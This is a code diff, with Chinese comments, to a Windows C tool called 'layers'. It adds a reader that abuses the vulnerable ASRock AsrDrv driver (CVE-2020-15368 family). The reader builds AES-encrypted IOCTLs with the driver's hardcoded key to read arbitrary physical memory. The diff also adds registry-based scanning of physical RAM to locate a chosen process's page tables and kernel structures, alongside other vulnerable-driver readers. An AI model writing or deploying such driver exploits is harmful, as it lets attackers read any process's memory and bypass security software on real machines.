@@ -19,6 +19,7 @@
 // without touching locator/translator.
 #define _WIN32_WINNT 0x0601
 #include <windows.h>
+#include <bcrypt.h>
 #include <stdio.h>
 #include <stdint.h>
 #include <string.h>
@@ -101,6 +102,73 @@ static int read_mock(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
     return 1;
 }
 
+// ---- 取数层 provider: ASRock AsrDrv(2).sys (CVE-2020-15368 family) ----
+// Outer IOCTL 0x22EC00 with AES-256-CBC payload; opcode 0x22E808 = physical read.
+#pragma pack(push, 1)
+typedef struct { WORD pad; DWORD iv_size; BYTE iv[21]; BYTE key[16]; BYTE pad2[3]; } asr_hdr;
+typedef struct { DWORD cmd_size; WORD pad; } asr_footer;
+typedef union { BYTE c[24]; WORD w[12]; DWORD d[6]; UINT64 q[3]; } asr_args;
+typedef struct { UINT opcode; int pad; asr_args args; } asr_cmd;
+#pragma pack(pop)
+
+static int asr_encrypt(const asr_cmd *cmd, BYTE **out_buf, DWORD *out_len) {
+    asr_hdr hdr;
+    memset(&hdr, 0, sizeof(hdr));
+    memset(hdr.iv, 0x69, sizeof(hdr.iv));
+    memset(hdr.key, 0x69, sizeof(hdr.key));
+    hdr.iv_size = sizeof(hdr.iv);
+    BYTE enc_key[32];
+    memset(enc_key, 0, sizeof(enc_key));
+    memcpy(enc_key, "C110DD4FE9434147B92A5A1E3FDBF29A", 32);
+    memcpy(&enc_key[13], hdr.key, 16);
+
+    BCRYPT_ALG_HANDLE hAlg = NULL;
+    BCRYPT_KEY_HANDLE hKey = NULL;
+    if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0) < 0) return 0;
+    if (BCryptGenerateSymmetricKey(hAlg, &hKey, NULL, 0, enc_key, sizeof(enc_key), 0) < 0) {
+        BCryptCloseAlgorithmProvider(hAlg, 0);
+        return 0;
+    }
+    BYTE cipher[128];
+    ULONG cb = 0;
+    BYTE iv[16];
+    memcpy(iv, hdr.iv, sizeof(iv));
+    NTSTATUS st = BCryptEncrypt(hKey, (PUCHAR)cmd, sizeof(*cmd), NULL, iv, sizeof(iv),
+                                cipher, sizeof(cipher), &cb, BCRYPT_BLOCK_PADDING);
+    BCryptDestroyKey(hKey);
+    BCryptCloseAlgorithmProvider(hAlg, 0);
+    if (st < 0) return 0;
+    DWORD total = (DWORD)(sizeof(hdr) + cb + sizeof(asr_footer));
+    BYTE *b = (BYTE *)calloc(1, total);
+    if (!b) return 0;
+    memcpy(b, &hdr, sizeof(hdr));
+    memcpy(b + sizeof(hdr), cipher, cb);
+    asr_footer *f = (asr_footer *)(b + total - sizeof(asr_footer));
+    f->cmd_size = cb;
+    *out_buf = b;
+    *out_len = total;
+    return 1;
+}
+
+static int read_asrdrv(mb_phys_reader *r, uint64_t pa, void *buf, uint32_t size) {
+    if (r->dev == INVALID_HANDLE_VALUE || !buf || !size) return 0;
+    asr_cmd cmd;
+    memset(&cmd, 0, sizeof(cmd));
+    cmd.opcode = 0x22E808u;                 // OPCODE_READ_PHYSMEM
+    cmd.args.q[0] = pa;
+    cmd.args.d[2] = size;                   // length
+    cmd.args.d[3] = 0;                      // byte granularity
+    cmd.args.q[2] = (UINT64)(uintptr_t)buf; // driver writes to this user buffer
+    BYTE *in = NULL;
+    DWORD inlen = 0;
+    if (!asr_encrypt(&cmd, &in, &inlen)) return 0;
+    BYTE out[0x40];
+    DWORD ret = 0;
+    BOOL ok = DeviceIoControl(r->dev, 0x22EC00u, in, inlen, out, sizeof(out), &ret, NULL);
+    free(in);
+    return ok ? 1 : 0;
+}
+
 static int reader_open(mb_phys_reader *r, const char *kind, const char *device) {
     memset(r, 0, sizeof(*r));
     r->dev = INVALID_HANDLE_VALUE;
@@ -128,8 +196,19 @@ static int reader_open(mb_phys_reader *r, const char *kind, const char *device) 
         r->read = read_eneio64;
         r->dev = CreateFileA(device ? device : "\\\\.\\GLCKIo",
                              GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+    } else if (_stricmp(kind, "asrdrv") == 0) {
+        r->name = "asrdrv";
+        r->mode = 4;
+        r->read = read_asrdrv;
+        const char *names[] = { device, "\\\\.\\AsrDrv109", "\\\\.\\GlobalRoot\\Device\\AsrDrv109",
+                                "\\\\.\\Global\\AsrDrv109", "\\\\.\\GlobalRoot\\Device\\AsrDrv104" };
+        for (int i = 0; i < (int)(sizeof(names) / sizeof(names[0])) && r->dev == INVALID_HANDLE_VALUE; i++) {
+            if (!names[i] || !names[i][0]) continue;
+            r->dev = CreateFileA(names[i], GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
+                                 NULL, OPEN_EXISTING, 0, NULL);
+        }
     } else {
-        fprintf(stderr, "[ERR] unknown reader '%s' (mock|cchwapi|rtkio|eneio64)\n", kind ? kind : "");
+        fprintf(stderr, "[ERR] unknown reader '%s' (mock|cchwapi|rtkio|eneio64|asrdrv)\n", kind ? kind : "");
         return 0;
     }
     if (r->dev == INVALID_HANDLE_VALUE) {
@@ -239,6 +318,75 @@ static int mb_layer_locate_cr3_scan(mb_phys_reader *r, uint64_t range_start, uin
     }
     free(buf);
     return found;
+}
+
+// ---------------------------------------------------------------------------
+// 定位层辅助：从注册表读取物理内存范围（HARDWARE\RESOURCEMAP\...\Physical Memory）
+// 这样物理扫描 locator 不需要用户手工提供范围，也不需要内核读驱动。
+// ---------------------------------------------------------------------------
+typedef struct { uint64_t start; uint64_t length; } mb_range;
+
+static int mb_phys_ranges_from_registry(mb_range *out, int max) {
+    HKEY key;
+    LONG e = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
+                      L"HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
+                      0, KEY_READ, &key);
+    if (e != ERROR_SUCCESS) {
+        fprintf(stderr, "[DBG] RegOpenKeyEx failed err=%ld\n", (long)e);
+        return 0;
+    }
+    DWORD type = 0, size = 0;
+    e = RegQueryValueExW(key, L".Translated", NULL, &type, NULL, &size);
+    if (e != ERROR_SUCCESS) {
+        fprintf(stderr, "[DBG] RegQueryValueEx size failed err=%ld type=%lu size=%lu\n",
+                (long)e, (unsigned long)type, (unsigned long)size);
+        RegCloseKey(key);
+        return 0;
+    }
+    if (size < 16) {
+        fprintf(stderr, "[DBG] registry value too small size=%lu type=%lu\n",
+                (unsigned long)size, (unsigned long)type);
+        RegCloseKey(key);
+        return 0;
+    }
+    BYTE *data = (BYTE *)malloc(size);
+    if (!data) { RegCloseKey(key); return 0; }
+    DWORD got = size;
+    e = RegQueryValueExW(key, L".Translated", NULL, &type, data, &got);
+    if (e != ERROR_SUCCESS) {
+        fprintf(stderr, "[DBG] RegQueryValueEx data failed err=%ld got=%lu\n", (long)e, (unsigned long)got);
+        free(data);
+        RegCloseKey(key);
+        return 0;
+    }
+    RegCloseKey(key);
+    if (got < 16) { fprintf(stderr, "[DBG] data too small got=%lu\n", (unsigned long)got); free(data); return 0; }
+
+    uint32_t count = *(uint32_t *)(data + 0);
+    uint32_t off = 8;                 // Count + 4-byte alignment padding
+    int n = 0;
+    for (uint32_t i = 0; i < count && off + 12 <= got && n < max; i++) {
+        off += 8;                     // InterfaceType + BusNumber
+        uint32_t parts = *(uint32_t *)(data + off);
+        off += 4;
+        for (uint32_t j = 0; j < parts && off + 20 <= got && n < max; j++) {
+            uint8_t dtype = data[off];
+            uint16_t flags = *(uint16_t *)(data + off + 2);
+            uint64_t start = *(uint64_t *)(data + off + 4);
+            uint32_t len = *(uint32_t *)(data + off + 12);
+            off += 20;
+            if ((dtype != 3 && dtype != 7) || !len) continue;  // 3 = Memory, 7 = MemoryLarge
+            uint64_t L = len;
+            if (flags & 0x200) L <<= 8;
+            else if (flags & 0x400) L <<= 16;
+            else if (flags & 0x800) L <<= 32;
+            out[n].start = start;
+            out[n].length = L;
+            n++;
+        }
+    }
+    free(data);
+    return n;
 }
 
 // ---------------------------------------------------------------------------
@@ -355,10 +503,12 @@ static void usage(void) {
     printf("layers - independent 定位层 / 翻译层 / 取数层 architecture\n");
     printf("Usage:\n");
     printf("  layers --selftest-mock\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64> [--device <path>] --read-phys --pa <hex> --size <n>\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64> [--device <path>] --cr3 <hex> --va <hex> --size <n>\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64> [--device <path>] --locate --pid <pid> --scan-start <hex> --scan-size <hex> [--name <exe>]\n");
-    printf("  layers --reader <cchwapi|rtkio|eneio64> [--device <path>] --locate --pid <pid> --scan-start <hex> --scan-size <hex> --va <hex> --size <n>\n");
+    printf("  layers --ranges                       (read physical RAM ranges from registry)\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv> [--device <path>] --read-phys --pa <hex> --size <n>\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv> [--device <path>] --cr3 <hex> --va <hex> --size <n>\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv> [--device <path>] --locate --pid <pid> --scan-start <hex> --scan-size <hex> [--name <exe>]\n");
+    printf("  layers --reader <cchwapi|rtkio|eneio64|asrdrv> [--device <path>] --locate --pid <pid> --auto-ranges [--name <exe>]\n");
+    printf("  layers --reader ... --locate --pid <pid> (--scan-start/--scan-size | --auto-ranges) --va <hex> --size <n>\n");
 }
 
 int main(int argc, char **argv) {
@@ -366,6 +516,7 @@ int main(int argc, char **argv) {
     uint64_t pa = 0, cr3 = 0, va = 0, scan_start = 0, scan_size = 0;
     uint32_t size = 0x40, pid = 0;
     int do_selftest = 0, do_read_phys = 0, do_explicit = 0, do_locate = 0, have_cr3 = 0, have_va = 0;
+    int do_ranges = 0, auto_ranges = 0;
     for (int i = 1; i < argc; i++) {
         if (strcmp(argv[i], "--selftest-mock") == 0) do_selftest = 1;
         else if (strcmp(argv[i], "--reader") == 0 && i + 1 < argc) kind = argv[++i];
@@ -380,10 +531,25 @@ int main(int argc, char **argv) {
         else if (strcmp(argv[i], "--scan-size") == 0 && i + 1 < argc) scan_size = _strtoui64(argv[++i], NULL, 0);
         else if (strcmp(argv[i], "--read-phys") == 0) do_read_phys = 1;
         else if (strcmp(argv[i], "--locate") == 0) do_locate = 1;
+        else if (strcmp(argv[i], "--ranges") == 0) do_ranges = 1;
+        else if (strcmp(argv[i], "--auto-ranges") == 0) auto_ranges = 1;
         else if (strcmp(argv[i], "--explicit") == 0) do_explicit = 1;
         else if (strcmp(argv[i], "--help") == 0 || strcmp(argv[i], "-h") == 0) { usage(); return 0; }
     }
     if (do_selftest) return selftest_mock();
+    if (do_ranges) {
+        mb_range rs[256];
+        int n = mb_phys_ranges_from_registry(rs, 256);
+        if (n <= 0) { printf("[ERR] cannot read physical memory ranges from registry\n"); return 5; }
+        printf("[OK] %d physical memory ranges (registry HARDWARE\\RESOURCEMAP):\n", n);
+        for (int i = 0; i < n; i++)
+            printf("  [%2d] 0x%llX - 0x%llX  len=0x%llX\n", i,
+                   (unsigned long long)rs[i].start,
+                   (unsigned long long)(rs[i].start + rs[i].length),
+                   (unsigned long long)rs[i].length);
+        printf("VERDICT=PASS\n");
+        return 0;
+    }
     if (!kind) { usage(); return 6; }
 
     mb_phys_reader r;
@@ -405,9 +571,23 @@ int main(int argc, char **argv) {
         if (have_cr3) {
             if (!mb_layer_locate_cr3_explicit(cr3, &got_cr3)) { printf("[ERR] bad explicit CR3\n"); rc = 5; }
             else printf("[OK] 定位层 explicit CR3=0x%llX\n", (unsigned long long)got_cr3);
-        } else if (pid && scan_size) {
+        } else if (pid && (scan_size || auto_ranges)) {
             if (!name) name = "";
-            if (!mb_layer_locate_cr3_scan(&r, scan_start, scan_size, pid, name, &got_cr3, &eproc)) {
+            int ok = 0;
+            if (auto_ranges) {
+                mb_range rs[256];
+                int n = mb_phys_ranges_from_registry(rs, 256);
+                printf("[OK] locator: %d physical ranges from registry\n", n);
+                for (int i = 0; i < n && !ok; i++) {
+                    if (rs[i].length < 0x1000) continue;
+                    ok = mb_layer_locate_cr3_scan(&r, rs[i].start, rs[i].length, pid, name,
+                                                  &got_cr3, &eproc);
+                }
+            } else {
+                ok = mb_layer_locate_cr3_scan(&r, scan_start, scan_size, pid, name,
+                                              &got_cr3, &eproc);
+            }
+            if (!ok) {
                 printf("[ERR] 定位层 scan failed (pid=%u name='%s')\n", pid, name);
                 rc = 5;
             } else {
